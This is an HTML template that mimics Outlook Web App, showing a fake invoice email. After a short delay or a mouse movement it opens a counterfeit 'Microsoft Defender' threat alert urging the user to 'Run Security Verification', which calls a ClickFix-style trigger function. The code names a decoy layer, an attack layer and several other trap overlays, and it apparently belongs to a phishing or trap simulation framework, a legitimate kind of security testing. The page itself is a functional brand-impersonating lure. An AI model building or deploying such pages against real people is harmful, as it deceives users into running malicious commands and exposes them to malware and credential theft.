{% extends "base_layout.html" %}

{% block title %}Outlook - Attachment Security Scan{% endblock %}

{% block content %}
<!-- Decoy Layer: Outlook Web App interface -->
<div id="decoy-layer" style="background-color: #f3f2f1; min-height: 100vh; font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;">
    
    <!-- Outlook Header -->
    <header style="background-color: #0078d4; padding: 8px 16px; display: flex; align-items: center; justify-content: space-between;">
        <div style="display: flex; align-items: center; gap: 20px;">
            <!-- Outlook Logo -->
            <div style="display: flex; align-items: center; gap: 10px;">
                <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect width="28" height="28" rx="2" fill="#0078d4"/>
                    <path d="M7 7h14v14H7V7z" fill="#0364b8"/>
                    <ellipse cx="14" cy="14" rx="5" ry="4" fill="white"/>
                </svg>
                <span style="color: white; font-size: 16px; font-weight: 600;">Outlook</span>
            </div>
            
            <!-- Search Bar -->
            <div style="background: rgba(255,255,255,0.15); border-radius: 4px; padding: 6px 12px; display: flex; align-items: center; gap: 8px; width: 400px;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="rgba(255,255,255,0.8)"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
                <span style="color: rgba(255,255,255,0.7); font-size: 14px;">Search mail and people</span>
            </div>
        </div>
        
        <div style="display: flex; align-items: center; gap: 16px;">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58a.49.49 0 0 0 .12-.61l-1.92-3.32a.488.488 0 0 0-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54a.484.484 0 0 0-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58a.49.49 0 0 0-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/></svg>
            <div style="width: 32px; height: 32px; border-radius: 50%; background-color: #5c2d91; display: flex; align-items: center; justify-content: center; color: white; font-weight: 600; font-size: 13px;">ME</div>
        </div>
    </header>

    <!-- Main Content Area -->
    <div style="display: flex; height: calc(100vh - 52px);">
        
        <!-- Left Sidebar -->
        <div style="width: 200px; background: white; border-right: 1px solid #edebe9; padding: 16px 0;">
            <button style="margin: 0 16px 16px 16px; background: #0078d4; color: white; border: none; padding: 10px 20px; border-radius: 4px; font-size: 14px; cursor: pointer; display: flex; align-items: center; gap: 8px;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
                New message
            </button>
            
            <div style="padding: 8px 16px; font-size: 14px; color: #323130; cursor: pointer; display: flex; align-items: center; gap: 12px; background: #e5f1fb;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="#0078d4"><path d="M19 3H4.99c-1.11 0-1.98.89-1.98 2L3 19c0 1.1.88 2 1.99 2H19c1.1 0 2-.9 2-2V5c0-1.11-.9-2-2-2zm0 12h-4c0 1.66-1.35 3-3 3s-3-1.34-3-3H4.99V5H19v10z"/></svg>
                <span style="font-weight: 600; color: #0078d4;">Inbox</span>
                <span style="margin-left: auto; background: #0078d4; color: white; padding: 2px 8px; border-radius: 10px; font-size: 12px;">3</span>
            </div>
            
            <div style="padding: 8px 16px; font-size: 14px; color: #323130; cursor: pointer; display: flex; align-items: center; gap: 12px;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="#605e5c"><path d="M22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6zm-2 0l-8 5-8-5h16zm0 12H4V8l8 5 8-5v10z"/></svg>
                <span>Sent Items</span>
            </div>
            
            <div style="padding: 8px 16px; font-size: 14px; color: #323130; cursor: pointer; display: flex; align-items: center; gap: 12px;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="#605e5c"><path d="M19 4h-3.5l-1-1h-5l-1 1H5v2h14V4zM6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12z"/></svg>
                <span>Deleted Items</span>
            </div>
        </div>

        <!-- Email List -->
        <div style="width: 350px; background: white; border-right: 1px solid #edebe9; overflow-y: auto;">
            <div style="padding: 12px 16px; border-bottom: 1px solid #edebe9;">
                <span style="font-size: 14px; font-weight: 600; color: #323130;">Focused</span>
                <span style="font-size: 14px; color: #605e5c; margin-left: 20px;">Other</span>
            </div>
            
            <!-- Email Item (Selected) -->
            <div style="padding: 12px 16px; border-left: 3px solid #0078d4; background: #f3f2f1; cursor: pointer;">
                <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 6px;">
                    <div style="width: 32px; height: 32px; border-radius: 50%; background-color: #107c41; display: flex; align-items: center; justify-content: center; color: white; font-weight: 600; font-size: 12px;">AC</div>
                    <div style="flex: 1;">
                        <p style="margin: 0; font-size: 14px; font-weight: 600; color: #323130;">Accounts Payable</p>
                        <p style="margin: 2px 0 0 0; font-size: 12px; color: #605e5c;">10:34 AM</p>
                    </div>
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#605e5c"><path d="M16.5 6v11.5c0 2.21-1.79 4-4 4s-4-1.79-4-4V5c0-1.38 1.12-2.5 2.5-2.5s2.5 1.12 2.5 2.5v10.5c0 .55-.45 1-1 1s-1-.45-1-1V6H10v9.5c0 1.38 1.12 2.5 2.5 2.5s2.5-1.12 2.5-2.5V5c0-2.21-1.79-4-4-4S7 2.79 7 5v12.5c0 3.04 2.46 5.5 5.5 5.5s5.5-2.46 5.5-5.5V6h-1.5z"/></svg>
                </div>
                <p style="margin: 0; font-size: 13px; font-weight: 600; color: #323130;">Invoice #INV-2024-1847 - Payment Required</p>
                <p style="margin: 4px 0 0 0; font-size: 12px; color: #605e5c; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">Please review the attached invoice for processing. Payment is due by...</p>
            </div>
            
            <!-- Other Emails -->
            <div style="padding: 12px 16px; border-bottom: 1px solid #f3f2f1; cursor: pointer;">
                <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 6px;">
                    <div style="width: 32px; height: 32px; border-radius: 50%; background-color: #0078d4; display: flex; align-items: center; justify-content: center; color: white; font-weight: 600; font-size: 12px;">HR</div>
                    <div style="flex: 1;">
                        <p style="margin: 0; font-size: 14px; color: #323130;">Human Resources</p>
                        <p style="margin: 2px 0 0 0; font-size: 12px; color: #605e5c;">9:15 AM</p>
                    </div>
                </div>
                <p style="margin: 0; font-size: 13px; color: #323130;">Benefits Enrollment Reminder</p>
                <p style="margin: 4px 0 0 0; font-size: 12px; color: #605e5c;">Open enrollment ends this Friday...</p>
            </div>
            
            <div style="padding: 12px 16px; border-bottom: 1px solid #f3f2f1; cursor: pointer;">
                <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 6px;">
                    <div style="width: 32px; height: 32px; border-radius: 50%; background-color: #5c2d91; display: flex; align-items: center; justify-content: center; color: white; font-weight: 600; font-size: 12px;">IT</div>
                    <div style="flex: 1;">
                        <p style="margin: 0; font-size: 14px; color: #323130;">IT Support</p>
                        <p style="margin: 2px 0 0 0; font-size: 12px; color: #605e5c;">Yesterday</p>
                    </div>
                </div>
                <p style="margin: 0; font-size: 13px; color: #323130;">System Maintenance Notice</p>
                <p style="margin: 4px 0 0 0; font-size: 12px; color: #605e5c;">Scheduled maintenance this weekend...</p>
            </div>
        </div>

        <!-- Email Content -->
        <div style="flex: 1; background: white; padding: 20px; overflow-y: auto;">
            <!-- Email Header -->
            <div style="border-bottom: 1px solid #edebe9; padding-bottom: 16px; margin-bottom: 20px;">
                <h1 style="margin: 0 0 12px 0; font-size: 22px; font-weight: 600; color: #323130;">Invoice #INV-2024-1847 - Payment Required</h1>
                <div style="display: flex; align-items: center; gap: 12px;">
                    <div style="width: 40px; height: 40px; border-radius: 50%; background-color: #107c41; display: flex; align-items: center; justify-content: center; color: white; font-weight: 600; font-size: 14px;">AC</div>
                    <div>
                        <p style="margin: 0; font-size: 14px; font-weight: 600; color: #323130;">Accounts Payable <span style="font-weight: 400; color: #605e5c;">&lt;ap@vendor-services.com&gt;</span></p>
                        <p style="margin: 2px 0 0 0; font-size: 12px; color: #605e5c;">To: You</p>
                    </div>
                    <span style="margin-left: auto; font-size: 12px; color: #605e5c;">Today at 10:34 AM</span>
                </div>
            </div>

            <!-- Email Body -->
            <div style="font-size: 14px; color: #323130; line-height: 1.6;">
                <p>Dear Valued Customer,</p>
                <p>Please find attached the invoice for services rendered in November 2024. The total amount due is <strong>$4,287.50</strong>.</p>
                <p>Payment is due within 30 days. Please review the attached document and process payment at your earliest convenience.</p>
                <p>If you have any questions regarding this invoice, please don't hesitate to contact our billing department.</p>
                <p>Best regards,<br>Accounts Payable Team</p>
            </div>

            <!-- Attachment Section -->
            <div style="margin-top: 30px; padding: 20px; background: #faf9f8; border-radius: 4px; border: 1px solid #edebe9;">
                <h3 style="margin: 0 0 16px 0; font-size: 14px; font-weight: 600; color: #323130; display: flex; align-items: center; gap: 8px;">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#605e5c"><path d="M16.5 6v11.5c0 2.21-1.79 4-4 4s-4-1.79-4-4V5c0-1.38 1.12-2.5 2.5-2.5s2.5 1.12 2.5 2.5v10.5c0 .55-.45 1-1 1s-1-.45-1-1V6H10v9.5c0 1.38 1.12 2.5 2.5 2.5s2.5-1.12 2.5-2.5V5c0-2.21-1.79-4-4-4S7 2.79 7 5v12.5c0 3.04 2.46 5.5 5.5 5.5s5.5-2.46 5.5-5.5V6h-1.5z"/></svg>
                    Attachments (1)
                </h3>
                
                <!-- Attachment Item -->
                <div style="display: flex; align-items: center; gap: 12px; padding: 12px; background: white; border: 1px solid #edebe9; border-radius: 4px;">
                    <svg width="40" height="40" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect width="48" height="48" rx="4" fill="#d93025"/>
                        <path d="M14 12h12l8 8v16c0 1.1-.9 2-2 2H14c-1.1 0-2-.9-2-2V14c0-1.1.9-2 2-2z" fill="#b71c1c"/>
                        <text x="24" y="32" text-anchor="middle" fill="white" font-size="10" font-weight="bold">PDF</text>
                    </svg>
                    <div style="flex: 1;">
                        <p style="margin: 0; font-size: 14px; font-weight: 600; color: #323130;">Invoice_INV-2024-1847.pdf</p>
                        <p style="margin: 4px 0 0 0; font-size: 12px; color: #605e5c;">847 KB â€¢ Scan in progress...</p>
                    </div>
                    <div style="display: flex; align-items: center; gap: 8px;">
                        <!-- Scanning Animation -->
                        <div style="display: flex; align-items: center; gap: 6px; padding: 6px 12px; background: #fff4ce; border-radius: 4px;">
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="#d83b01" class="scanning-icon">
                                <path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/>
                            </svg>
                            <span style="font-size: 12px; color: #d83b01; font-weight: 500;">Scanning</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}

{# Define embedded attack layer - only shown if no external trap_type is set #}
{% block attack_layer %}
{% if not trap_type %}
<!-- Attack Layer: Security scan blocked popup -->
<div id="attack-layer" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(3px); z-index: 900; justify-content: center; align-items: center;">
    <div style="background-color: white; max-width: 480px; width: 90%; border-radius: 8px; box-shadow: 0 25px 50px rgba(0,0,0,0.3); overflow: hidden;">
        
        <!-- Header -->
        <div style="background: linear-gradient(135deg, #d93025 0%, #b71c1c 100%); padding: 20px; display: flex; align-items: center; gap: 15px;">
            <div style="background: rgba(255,255,255,0.2); padding: 12px; border-radius: 50%;">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="white">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                </svg>
            </div>
            <div>
                <h2 style="margin: 0; color: white; font-size: 18px; font-weight: 600;">Microsoft Defender</h2>
                <p style="margin: 4px 0 0 0; color: rgba(255,255,255,0.9); font-size: 13px;">Attachment Security Scanner</p>
            </div>
        </div>

        <!-- Content -->
        <div style="padding: 24px;">
            <!-- Alert Box -->
            <div style="background: #fef2f2; border: 1px solid #fecaca; border-radius: 6px; padding: 16px; margin-bottom: 20px;">
                <div style="display: flex; align-items: flex-start; gap: 12px;">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="#dc2626" style="flex-shrink: 0;">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                    </svg>
                    <div>
                        <p style="margin: 0; font-size: 14px; font-weight: 600; color: #991b1b;">Potential Threat Detected</p>
                        <p style="margin: 6px 0 0 0; font-size: 13px; color: #7f1d1d; line-height: 1.5;">
                            The attachment <strong>Invoice_INV-2024-1847.pdf</strong> contains elements that require additional verification before it can be safely opened.
                        </p>
                    </div>
                </div>
            </div>

            <!-- Scan Details -->
            <div style="background: #f8fafc; border-radius: 6px; padding: 16px; margin-bottom: 20px;">
                <h4 style="margin: 0 0 12px 0; font-size: 13px; font-weight: 600; color: #475569; text-transform: uppercase; letter-spacing: 0.5px;">Scan Details</h4>
                <div style="display: grid; gap: 8px; font-size: 13px;">
                    <div style="display: flex; justify-content: space-between;">
                        <span style="color: #64748b;">File Name:</span>
                        <span style="color: #1e293b; font-weight: 500;">Invoice_INV-2024-1847.pdf</span>
                    </div>
                    <div style="display: flex; justify-content: space-between;">
                        <span style="color: #64748b;">File Size:</span>
                        <span style="color: #1e293b;">847 KB</span>
                    </div>
                    <div style="display: flex; justify-content: space-between;">
                        <span style="color: #64748b;">Threat Level:</span>
                        <span style="color: #f59e0b; font-weight: 600;">Medium Risk</span>
                    </div>
                    <div style="display: flex; justify-content: space-between;">
                        <span style="color: #64748b;">Detection:</span>
                        <span style="color: #1e293b;">Embedded Script (Macro)</span>
                    </div>
                </div>
            </div>

            <p style="margin: 0 0 20px 0; font-size: 13px; color: #64748b; line-height: 1.5;">
                To safely view this attachment, run the security verification process. This will sandbox the file and remove any potentially harmful content.
            </p>

            <button onclick="triggerClickFix()" style="width: 100%; background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); color: white; border: none; padding: 14px; font-size: 15px; font-weight: 600; cursor: pointer; border-radius: 6px; display: flex; align-items: center; justify-content: center; gap: 10px; transition: transform 0.1s, box-shadow 0.2s;" onmouseover="this.style.transform='translateY(-1px)'; this.style.boxShadow='0 4px 12px rgba(0,120,212,0.4)'" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='none'">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
                </svg>
                Run Security Verification
            </button>

            <div style="margin-top: 16px; display: flex; justify-content: center; gap: 20px;">
                <a href="#" style="font-size: 12px; color: #0078d4; text-decoration: none;">Report false positive</a>
                <a href="#" style="font-size: 12px; color: #0078d4; text-decoration: none;">Learn more</a>
            </div>
        </div>

        <!-- Footer -->
        <div style="padding: 12px 24px; background: #f8fafc; border-top: 1px solid #e2e8f0;">
            <p style="margin: 0; font-size: 11px; color: #94a3b8; text-align: center;">
                Protected by Microsoft Defender for Office 365
            </p>
        </div>
    </div>
</div>
{% endif %}
{% endblock %}

{% block extra_css %}
<style>
@keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
}
.scanning-icon {
    animation: spin 1.5s linear infinite;
}
</style>
{% endblock %}

{% block extra_js %}
<script>
    let triggered = false;

    function showLure() {
        if (!triggered) {
            triggered = true;
            // Check for embedded attack layer first, then external trap overlays
            const attackLayer = document.getElementById('attack-layer') ||
                               document.getElementById('cf-overlay') ||
                               document.getElementById('chrome-overlay') ||
                               document.getElementById('wu-trigger-overlay') ||
                               document.getElementById('filefix-overlay');
            if (attackLayer) {
                attackLayer.style.display = 'flex';
            }
        }
    }

    // Trigger after a delay simulating scan completion
    setTimeout(function() {
        if (!triggered) {
            showLure();
        }
    }, 3000);

    // Also trigger on mouse movement
    document.addEventListener('mousemove', function() {
        if (!triggered) {
            setTimeout(showLure, 1500);
        }
    }, { once: true });
</script>
{% endblock %}